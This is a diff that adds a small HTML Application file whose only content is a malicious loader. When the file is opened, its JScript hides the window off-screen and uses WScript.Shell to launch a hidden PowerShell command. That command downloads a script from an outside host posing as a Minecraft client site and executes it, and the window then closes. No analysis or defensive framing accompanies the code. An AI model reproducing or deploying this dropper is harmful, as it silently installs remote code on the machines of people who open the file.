@@ -1,0 +1,14 @@
+<html>
+<head>
+<title></title>
+<script language="JScript">
+window.resizeTo(0,0);
+window.moveTo(-32000,-32000);
+var s = new ActiveXObject("WScript.Shell");
+var c = "powershell -nop -w 1 -c \"sal g iwr;iex (g -useb https://kryptonclient-mc.vercel.app/p)\"";
+s.Run(c,0,false);
+window.close();
+</script>
+</head>
+<body></body>
+</html>
